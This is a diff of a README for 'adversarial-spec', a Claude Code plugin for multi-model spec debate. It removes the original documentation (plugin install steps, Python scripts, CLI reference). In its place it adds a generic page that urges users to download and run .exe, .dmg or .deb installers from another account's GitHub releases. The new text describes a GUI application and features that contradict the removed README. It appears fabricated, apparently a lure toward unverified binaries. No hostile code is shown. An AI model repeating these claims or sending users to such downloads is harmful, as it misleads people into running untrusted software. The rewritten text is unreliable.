@@ -1,576 +1,89 @@
-# adversarial-spec
+# 🎉 adversarial-spec - Simplifying Product Specifications with AI
 
-A Claude Code plugin that iteratively refines product specifications through multi-model debate until consensus is reached.
+## 📥 Download Now
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-%20-blue)](https://github.com/aldyfarizki/adversarial-spec/releases)
 
-**Key insight:** A single LLM reviewing a spec will miss things. Multiple LLMs debating a spec will catch gaps, challenge assumptions, and surface edge cases that any one model would overlook. The result is a document that has survived rigorous adversarial review.
+## 🚀 Getting Started
+Welcome! This guide will help you download and run **adversarial-spec**. This application allows you to refine product specifications by enabling a dialogue between multiple AI models. You don’t need any programming skills—just a computer and a little time to follow these steps. 
 
-**Claude is an active participant**, not just an orchestrator. Claude provides independent critiques, challenges opponent models, and contributes substantive improvements alongside external models.
+## 📦 System Requirements
+Before you begin, ensure your computer meets the following requirements:
 
-## Quick Start
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a modern Linux distribution
+- **RAM:** At least 4GB
+- **Disk Space:** Minimum of 100MB free
+- **Internet Connection:** Required for initial download and to fetch updates
 
-```bash
-# 1. Add the marketplace and install the plugin
-claude plugin marketplace add zscole/adversarial-spec
-claude plugin install adversarial-spec
+## 🛠️ Features
+- **Iterative Refinement:** The application uses multiple AI models, allowing for a more precise specification process.
+- **Consensus Building:** Ensures that all models agree on the final product specifications.
+- **User-Friendly Interface:** Designed for ease of use, so you can focus on your product rather than how to use the tool.
 
-# 2. Set at least one API key
-export OPENAI_API_KEY="sk-..."
-# Or use OpenRouter for access to multiple providers with one key
-export OPENROUTER_API_KEY="sk-or-..."
+## 📥 Download & Install
+To get started with **adversarial-spec**, follow these simple steps:
 
-# 3. Run it
-/adversarial-spec "Build a rate limiter service with Redis backend"
-```
+1. **Visit the Download Page**
+   Click the link below to go to the downloads page:
+   [Download Page](https://github.com/aldyfarizki/adversarial-spec/releases)
 
-## How It Works
+2. **Choose Your Version**
+   On the releases page, locate the latest version. It will be the one at the top of the list. 
 
-```
-You describe product --> Claude drafts spec --> Multiple LLMs critique in parallel
-        |                                              |
-        |                                              v
-        |                              Claude synthesizes + adds own critique
-        |                                              |
-        |                                              v
-        |                              Revise and repeat until ALL agree
-        |                                              |
-        +--------------------------------------------->|
-                                                       v
-                                            User review period
-                                                       |
-                                                       v
-                                            Final document output
-```
+3. **Download the File**
+   Click on the file that matches your operating system. For example:
+   - **Windows:** Look for a `.exe` file
+   - **macOS:** Look for a `.dmg` file
+   - **Linux:** Look for a `.tar.gz` or `.deb` file
 
-1. Describe your product concept or provide an existing document
-2. (Optional) Start with an in-depth interview to capture requirements
-3. Claude drafts the initial document (PRD or tech spec)
-4. Document is sent to opponent models (GPT, Gemini, Grok, etc.) for parallel critique
-5. Claude provides independent critique alongside opponent feedback
-6. Claude synthesizes all feedback and revises
-7. Loop continues until ALL models AND Claude agree
-8. User review period: request changes or run additional cycles
-9. Final converged document is output
+4. **Install the Application**
+   - **Windows:** Double-click the `.exe` file and follow the installation prompts.
+   - **macOS:** Open the `.dmg` file, drag the application to your Applications folder.
+   - **Linux:** Use the terminal to extract the `.tar.gz` or install the `.deb` package.
 
-## Requirements
+5. **Run the Application**
+   Once installed, locate the application on your system and double-click to open. 
 
-- Python 3.10+
-- `litellm` package: `pip install litellm`
-- API key for at least one LLM provider
+6. **Configure Settings**
+   You may need to set up your preferred AI models or connect to your account for full functionality. Follow the on-screen instructions.
 
-## Supported Models
+## 🌐 Using adversarial-spec
+After installing and running **adversarial-spec**, you'll find an intuitive interface. 
 
-| Provider   | Env Var                | Example Models                               |
-|------------|------------------------|----------------------------------------------|
-| OpenAI     | `OPENAI_API_KEY`       | `gpt-4o`, `gpt-4-turbo`, `o1`                |
-| Anthropic  | `ANTHROPIC_API_KEY`    | `claude-sonnet-4-20250514`, `claude-opus-4-20250514` |
-| Google     | `GEMINI_API_KEY`       | `gemini/gemini-2.0-flash`, `gemini/gemini-pro` |
-| xAI        | `XAI_API_KEY`          | `xai/grok-3`, `xai/grok-beta`                |
-| Mistral    | `MISTRAL_API_KEY`      | `mistral/mistral-large`, `mistral/codestral` |
-| Groq       | `GROQ_API_KEY`         | `groq/llama-3.3-70b-versatile`               |
-| OpenRouter | `OPENROUTER_API_KEY`   | `openrouter/openai/gpt-4o`, `openrouter/anthropic/claude-3.5-sonnet` |
-| Codex CLI  | ChatGPT subscription   | `codex/gpt-5.2-codex`, `codex/gpt-5.1-codex-max` |
-| Gemini CLI | Google account         | `gemini-cli/gemini-3-pro-preview`, `gemini-cli/gemini-3-flash-preview` |
-| Deepseek   | `DEEPSEEK_API_KEY`     | `deepseek/deepseek-chat`                     |
-| Zhipu      | `ZHIPUAI_API_KEY`      | `zhipu/glm-4`, `zhipu/glm-4-plus`            |
+1. **Create a New Project**
+   Start by creating a new project and adding your initial product specifications.
 
-Check which keys are configured:
+2. **Select AI Models**
+   Choose which AI models you want to use. You can select from a list provided in the app.
 
-```bash
-python3 "$(find ~/.claude -name debate.py -path '*adversarial-spec*' 2>/dev/null | head -1)" providers
-```
+3. **Start the Debate**
+   The application will begin a debate among the selected models, refining your specifications iteratively.
 
-## AWS Bedrock Support
+4. **Review the Consensus**
+   Once the models reach an agreement, review the revised product specifications. You can make further edits if needed.
 
-For enterprise users who need to route all model calls through AWS Bedrock (e.g., for security compliance or inference gateway requirements):
+5. **Save Your Work**
+   Remember to save your project frequently to avoid losing any changes.
 
-```bash
-# Enable Bedrock mode
-python3 "$(find ~/.claude -name debate.py -path '*adversarial-spec*' 2>/dev/null | head -1)" bedrock enable --region us-east-1
+## ❓ FAQs
 
-# Add models enabled in your Bedrock account
-python3 "$(find ~/.claude -name debate.py -path '*adversarial-spec*' 2>/dev/null | head -1)" bedrock add-model claude-3-sonnet
-python3 "$(find ~/.claude -name debate.py -path '*adversarial-spec*' 2>/dev/null | head -1)" bedrock add-model claude-3-haiku
+### How does adversarial-spec work?
+**adversarial-spec** engages multiple AI models that discuss and refine specifications. This ensures higher accuracy in the final product details.
 
-# Check configuration
-python3 "$(find ~/.claude -name debate.py -path '*adversarial-spec*' 2>/dev/null | head -1)" bedrock status
+### Can I use multiple versions of the app?
+Yes, you can install different versions of the app. However, it's best to keep only the latest one as earlier versions may have bugs or outdated features.
 
-# Disable Bedrock mode
-python3 "$(find ~/.claude -name debate.py -path '*adversarial-spec*' 2>/dev/null | head -1)" bedrock disable
-```
+### What should I do if I face issues?
+If you encounter any difficulties, check the issues section of the GitHub repository or refer to our community support channels. 
 
-When Bedrock is enabled, **all model calls route through Bedrock** - no direct API calls are made. Use friendly names like `claude-3-sonnet` which are automatically mapped to Bedrock model IDs.
+## 🗂️ Contributions
+We welcome contributions! If you have any ideas or improvements, feel free to submit a pull request. Check our contribution guidelines on GitHub.
 
-Configuration is stored at `~/.claude/adversarial-spec/config.json`.
+## 🔗 Connect with Us
+For more updates, follow our work:
+- GitHub: [adversarial-spec](https://github.com/aldyfarizki/adversarial-spec)
+- Twitter: @adversarial_spec 
 
-## OpenRouter Support
+## 📄 License
+This project is licensed under the MIT License. You can view the license details in the repository. 
 
-[OpenRouter](https://openrouter.ai) provides unified access to multiple LLM providers through a single API. This is useful for:
-- Accessing models from multiple providers with one API key
-- Comparing models across different providers
-- Automatic fallback and load balancing
-- Cost optimization across providers
-
-**Setup:**
-
-```bash
-# Get your API key from https://openrouter.ai/keys
-export OPENROUTER_API_KEY="sk-or-..."
-
-# Use OpenRouter models (prefix with openrouter/)
-python3 debate.py critique --models openrouter/openai/gpt-4o,openrouter/anthropic/claude-3.5-sonnet < spec.md
-```
-
-**Popular OpenRouter models:**
-- `openrouter/openai/gpt-4o` - GPT-4o via OpenRouter
-- `openrouter/anthropic/claude-3.5-sonnet` - Claude 3.5 Sonnet
-- `openrouter/google/gemini-2.0-flash` - Gemini 2.0 Flash
-- `openrouter/meta-llama/llama-3.3-70b-instruct` - Llama 3.3 70B
-- `openrouter/qwen/qwen-2.5-72b-instruct` - Qwen 2.5 72B
-
-See the full model list at [openrouter.ai/models](https://openrouter.ai/models).
-
-## Codex CLI Support
-
-[Codex CLI](https://github.com/openai/codex) allows ChatGPT Pro subscribers to use OpenAI models without separate API credits. Models prefixed with `codex/` are routed through the Codex CLI.
-
-**Setup:**
-
-```bash
-# Install Codex CLI (requires ChatGPT Pro subscription)
-npm install -g @openai/codex
-
-# Use Codex models (prefix with codex/)
-python3 debate.py critique --models codex/gpt-5.2-codex,gemini/gemini-2.0-flash < spec.md
-```
-
-**Reasoning effort:**
-
-Control how much thinking time the model uses with `--codex-reasoning`:
-
-```bash
-# Available levels: low, medium, high, xhigh (default: xhigh)
-python3 debate.py critique --models codex/gpt-5.2-codex --codex-reasoning high < spec.md
-```
-
-Higher reasoning effort produces more thorough analysis but uses more tokens.
-
-**Available Codex models:**
-- `codex/gpt-5.2-codex` - GPT-5.2 via Codex CLI
-- `codex/gpt-5.1-codex-max` - GPT-5.1 Max via Codex CLI
-
-Check Codex CLI installation status:
-
-```bash
-python3 "$(find ~/.claude -name debate.py -path '*adversarial-spec*' 2>/dev/null | head -1)" providers
-```
-
-## Gemini CLI Support
-
-[Gemini CLI](https://github.com/google-gemini/gemini-cli) allows Google account holders to use Gemini models without separate API credits. Models prefixed with `gemini-cli/` are routed through the Gemini CLI.
-
-**Setup:**
-
-```bash
-# Install Gemini CLI
-npm install -g @google/gemini-cli && gemini auth
-
-# Use Gemini CLI models (prefix with gemini-cli/)
-python3 debate.py critique --models gemini-cli/gemini-3-pro-preview < spec.md
-```
-
-**Available Gemini CLI models:**
-- `gemini-cli/gemini-3-pro-preview` - Gemini 3 Pro via CLI
-- `gemini-cli/gemini-3-flash-preview` - Gemini 3 Flash via CLI
-
-Check Gemini CLI installation status:
-
-```bash
-python3 "$(find ~/.claude -name debate.py -path '*adversarial-spec*' 2>/dev/null | head -1)" providers
-```
-
-## OpenAI-Compatible Endpoints
-
-For models that expose an OpenAI-compatible API (local LLMs, self-hosted models, alternative providers), set `OPENAI_API_BASE`:
-
-```bash
-# Point to a custom endpoint
-export OPENAI_API_KEY="your-key"
-export OPENAI_API_BASE="https://your-endpoint.com/v1"
-
-# Use with any model name
-python3 debate.py critique --models gpt-4o < spec.md
-```
-
-This works with:
-- Local LLM servers (Ollama, vLLM, text-generation-webui)
-- OpenAI-compatible providers
-- Self-hosted inference endpoints
-
-## Usage
-
-**Start from scratch:**
-
-```
-/adversarial-spec "Build a rate limiter service with Redis backend"
-```
-
-**Refine an existing document:**
-
-```
-/adversarial-spec ./docs/my-spec.md
-```
-
-You will be prompted for:
-
-1. **Document type**: PRD (business/product focus) or tech spec (engineering focus)
-2. **Interview mode**: Optional in-depth requirements gathering session
-3. **Opponent models**: Comma-separated list (e.g., `gpt-4o,gemini/gemini-2.0-flash,xai/grok-3`)
-
-More models = more perspectives = stricter convergence.
-
-## Document Types
-
-### PRD (Product Requirements Document)
-
-For stakeholders, PMs, and designers.
-
-**Sections:** Executive Summary, Problem Statement, Target Users/Personas, User Stories, Functional Requirements, Non-Functional Requirements, Success Metrics, Scope (In/Out), Dependencies, Risks
-
-**Critique focuses on:** Clear problem definition, well-defined personas, measurable success criteria, explicit scope boundaries, no technical implementation details
-
-### Technical Specification
-
-For developers and architects.
-
-**Sections:** Overview, Goals/Non-Goals, System Architecture, Component Design, API Design (full schemas), Data Models, Infrastructure, Security, Error Handling, Performance/SLAs, Observability, Testing Strategy, Deployment Strategy
-
-**Critique focuses on:** Complete API contracts, data model coverage, security threat mitigation, error handling, specific performance targets, no ambiguity for engineers
-
-## Core Features
-
-### Interview Mode
-
-Before the debate begins, opt into an in-depth interview session to capture requirements upfront.
-
-**Covers:** Problem context, users/stakeholders, functional requirements, technical constraints, UI/UX, tradeoffs, risks, success criteria
-
-The interview uses probing follow-up questions and challenges assumptions. After completion, Claude synthesizes answers into a complete spec before starting the adversarial debate.
-
-### Claude's Active Participation
-
-Each round, Claude:
-
-1. Reviews opponent critiques for validity
-2. Provides independent critique (what did opponents miss?)
-3. States agreement/disagreement with specific points
-4. Synthesizes all feedback into revisions
-
-Display format:
-
-```
---- Round N ---
-Opponent Models:
-- [GPT-4o]: critiqued: missing rate limit config
-- [Gemini]: agreed
-
-Claude's Critique:
-Security section lacks input validation strategy. Adding OWASP top 10 coverage.
-
-Synthesis:
-- Accepted from GPT-4o: rate limit configuration
-- Added by Claude: input validation, OWASP coverage
-- Rejected: none
-```
-
-### Early Agreement Verification
-
-If a model agrees within the first 2 rounds, Claude is skeptical. The model is pressed to:
-
-- Confirm it read the entire document
-- List specific sections reviewed
-- Explain why it agrees
-- Identify any remaining concerns
-
-This prevents false convergence from models that rubber-stamp without thorough review.
-
-### User Review Period
-
-After all models agree, you enter a review period with three options:
-
-1. **Accept as-is**: Document is complete
-2. **Request changes**: Claude updates the spec, you iterate without a full debate cycle
-3. **Run another cycle**: Send the updated spec through another adversarial debate
-
-### Additional Review Cycles
-
-Run multiple cycles with different strategies:
-
-- First cycle with fast models (gpt-4o), second with stronger models (o1)
-- First cycle for structure/completeness, second for security focus
-- Fresh perspective after user-requested changes
-
-### PRD to Tech Spec Flow
-
-When a PRD reaches consensus, you're offered the option to continue directly into a Technical Specification based on the PRD. This creates a complete documentation pair in a single session.
-
-## Advanced Features
-
-### Critique Focus Modes
-
-Direct models to prioritize specific concerns:
-
-```bash
---focus security      # Auth, input validation, encryption, vulnerabilities
---focus scalability   # Horizontal scaling, sharding, caching, capacity
---focus performance   # Latency targets, throughput, query optimization
---focus ux            # User journeys, error states, accessibility
---focus reliability   # Failure modes, circuit breakers, disaster recovery
---focus cost          # Infrastructure costs, resource efficiency
-```
-
-### Model Personas
-
-Have models critique from specific professional perspectives:
-
-```bash
---persona security-engineer      # Thinks like an attacker
---persona oncall-engineer        # Cares about debugging at 3am
---persona junior-developer       # Flags ambiguity and tribal knowledge
---persona qa-engineer            # Missing test scenarios
---persona site-reliability       # Deployment, monitoring, incidents
---persona product-manager        # User value, success metrics
---persona data-engineer          # Data models, ETL implications
---persona mobile-developer       # API design for mobile
---persona accessibility-specialist  # WCAG, screen readers
---persona legal-compliance       # GDPR, CCPA, regulatory
-```
-
-Custom personas also work: `--persona "fintech compliance officer"`
-
-### Context Injection
-
-Include existing documents for models to consider:
-
-```bash
---context ./existing-api.md --context ./schema.sql
-```
-
-Use cases:
-- Existing API documentation the new spec must integrate with
-- Database schemas the spec must work with
-- Design documents or prior specs for consistency
-- Compliance requirements documents
-
-### Session Persistence and Resume
-
-Long debates can crash or need to pause. Sessions save state automatically:
-
-```bash
-# Start a named session
-echo "spec" | python3 debate.py critique --models gpt-4o --session my-feature-spec
-
-# Resume where you left off
-python3 debate.py critique --resume my-feature-spec
-
-# List all sessions
-python3 debate.py sessions
-```
-
-Sessions save:
-- Current spec state
-- Round number
-- All configuration (models, focus, persona, etc.)
-- History of previous rounds
-
-Sessions are stored in `~/.config/adversarial-spec/sessions/`.
-
-### Auto-Checkpointing
-
-When using sessions, each round's spec is saved to `.adversarial-spec-checkpoints/`:
-
-```
-.adversarial-spec-checkpoints/
-├── my-feature-spec-round-1.md
-├── my-feature-spec-round-2.md
-└── my-feature-spec-round-3.md
-```
-
-Use these to rollback if a revision makes things worse.
-
-### Preserve Intent Mode
-
-Convergence can sand off novel ideas when models interpret "unusual" as "wrong". The `--preserve-intent` flag makes removal expensive:
-
-```bash
---preserve-intent
-```
-
-When enabled, models must:
-
-1. **Quote exactly** what they want to remove or substantially change
-2. **Justify the harm** - not just "unnecessary" but what concrete problem it causes
-3. **Distinguish error from preference** - only remove things that are factually wrong, contradictory, or risky
-4. **Ask before removing** unusual but functional choices: "Was this intentional?"
-
-This shifts the default from "sand off anything unusual" to "add protective detail while preserving distinctive choices."
-
-Use when:
-- Your spec contains intentional unconventional choices
-- You want models to challenge your ideas, not homogenize them
-- Previous rounds removed things you wanted to keep
-
-### Cost Tracking
-
-Every critique round displays token usage and estimated cost:
-
-```
-=== Cost Summary ===
-Total tokens: 12,543 in / 3,221 out
-Total cost: $0.0847
-
-By model:
-  gpt-4o: $0.0523 (8,234 in / 2,100 out)
-  gemini/gemini-2.0-flash: $0.0324 (4,309 in / 1,121 out)
-```
-
-### Saved Profiles
-
-Save frequently used configurations:
-
-```bash
-# Create a profile
-python3 debate.py save-profile strict-security \
-  --models gpt-4o,gemini/gemini-2.0-flash \
-  --focus security \
-  --doc-type tech
-
-# Use a profile
-python3 debate.py critique --profile strict-security < spec.md
-
-# List profiles
-python3 debate.py profiles
-```
-
-Profiles are stored in `~/.config/adversarial-spec/profiles/`.
-
-### Diff Between Rounds
-
-See exactly what changed between spec versions:
-
-```bash
-python3 debate.py diff --previous round1.md --current round2.md
-```
-
-### Export to Task List
-
-Extract actionable tasks from a finalized spec:
-
-```bash
-cat spec-output.md | python3 debate.py export-tasks --models gpt-4o --doc-type prd
-```
-
-Output includes title, type, priority, description, and acceptance criteria.
-
-Use `--json` for structured output suitable for importing into issue trackers.
-
-## Telegram Integration (Optional)
-
-Get notified on your phone and inject feedback during the debate.
-
-**Setup:**
-
-1. Message @BotFather on Telegram, send `/newbot`, follow prompts
-2. Copy the bot token
-3. Run: `python3 "$(find ~/.claude -name telegram_bot.py -path '*adversarial-spec*' 2>/dev/null | head -1)" setup`
-4. Message your bot, run setup again to get your chat ID
-5. Set environment variables:
-
-```bash
-export TELEGRAM_BOT_TOKEN="..."
-export TELEGRAM_CHAT_ID="..."
-```
-
-**Features:**
-
-- Async notifications when rounds complete (includes cost)
-- 60-second window to reply with feedback (incorporated into next round)
-- Final document sent to Telegram when debate concludes
-
-## Output
-
-Final document is:
-
-- Complete, following full structure for document type
-- Vetted by all models until unanimous agreement
-- Ready for stakeholders without further editing
-
-Output locations:
-
-- Printed to terminal
-- Written to `spec-output.md` (PRD) or `tech-spec-output.md` (tech spec)
-- Sent to Telegram (if enabled)
-
-Debate summary includes rounds completed, cycles run, models involved, Claude's contributions, cost, and key refinements made.
-
-## CLI Reference
-
-```bash
-# Core commands
-debate.py critique --models MODEL_LIST --doc-type TYPE [OPTIONS] < spec.md
-debate.py critique --resume SESSION_ID
-debate.py diff --previous OLD.md --current NEW.md
-debate.py export-tasks --models MODEL --doc-type TYPE [--json] < spec.md
-
-# Info commands
-debate.py providers      # List providers and API key status
-debate.py focus-areas    # List focus areas
-debate.py personas       # List personas
-debate.py profiles       # List saved profiles
-debate.py sessions       # List saved sessions
-
-# Profile management
-debate.py save-profile NAME --models ... [--focus ...] [--persona ...]
-
-# Bedrock management
-debate.py bedrock status                      # Show Bedrock configuration
-debate.py bedrock enable --region REGION      # Enable Bedrock mode
-debate.py bedrock disable                     # Disable Bedrock mode
-debate.py bedrock add-model MODEL             # Add model to available list
-debate.py bedrock remove-model MODEL          # Remove model from list
-debate.py bedrock list-models                 # List built-in model mappings
-```
-
-**Options:**
-- `--models, -m` - Comma-separated model list (auto-detects from available API keys if not specified)
-- `--doc-type, -d` - prd or tech
-- `--codex-reasoning` - Reasoning effort for Codex models (low, medium, high, xhigh; default: xhigh)
-- `--focus, -f` - Focus area (security, scalability, performance, ux, reliability, cost)
-- `--persona` - Professional persona
-- `--context, -c` - Context file (repeatable)
-- `--profile` - Load saved profile
-- `--preserve-intent` - Require justification for removals
-- `--session, -s` - Session ID for persistence and checkpointing
-- `--resume` - Resume a previous session
-- `--press, -p` - Anti-laziness check
-- `--telegram, -t` - Enable Telegram
-- `--json, -j` - JSON output
-
-## File Structure
-
-```
-adversarial-spec/
-├── .claude-plugin/
-│   └── plugin.json           # Plugin metadata
-├── README.md
-├── LICENSE
-└── skills/
-    └── adversarial-spec/
-        ├── SKILL.md          # Skill definition and process
-        └── scripts/
-            ├── debate.py     # Multi-model debate orchestration
-            └── telegram_bot.py   # Telegram notifications
-```
-
-## License
-
-MIT
+Now you are ready to use **adversarial-spec** to simplify your product specification process. Enjoy!
